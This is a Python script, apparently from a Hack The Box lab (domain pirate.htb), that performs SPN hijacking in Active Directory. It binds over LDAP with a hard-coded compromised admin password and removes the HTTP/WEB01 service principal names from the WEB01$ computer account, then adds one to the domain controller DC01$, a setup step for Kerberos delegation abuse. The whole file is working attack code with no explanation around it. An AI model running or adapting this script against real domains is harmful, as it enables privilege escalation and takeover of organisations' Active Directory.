#!/usr/bin/env python3
"""SPN Hijacking - Move HTTP/WEB01.pirate.htb from WEB01$ to DC01$"""

import ldap3

server = ldap3.Server('ldap://10.129.15.19')
conn = ldap3.Connection(server, 'pirate.htb\\a.white_adm', 'Hacked123!', authentication=ldap3.NTLM, auto_bind=True)
print(f'[+] Bound as: {conn.extend.standard.who_am_i()}')

# Remove HTTP/WEB01.pirate.htb from WEB01$
conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['HTTP/WEB01.pirate.htb'])]})
print(f'[*] Remove SPN from WEB01$: {conn.result["description"]}')

# Remove HTTP/WEB01 too
conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_DELETE, ['HTTP/WEB01'])]})
print(f'[*] Remove SPN HTTP/WEB01 from WEB01$: {conn.result["description"]}')

# Add HTTP/WEB01.pirate.htb to DC01$
conn.modify('CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb',
    {'servicePrincipalName': [(ldap3.MODIFY_ADD, ['HTTP/WEB01.pirate.htb'])]})
print(f'[*] Add SPN to DC01$: {conn.result["description"]}')
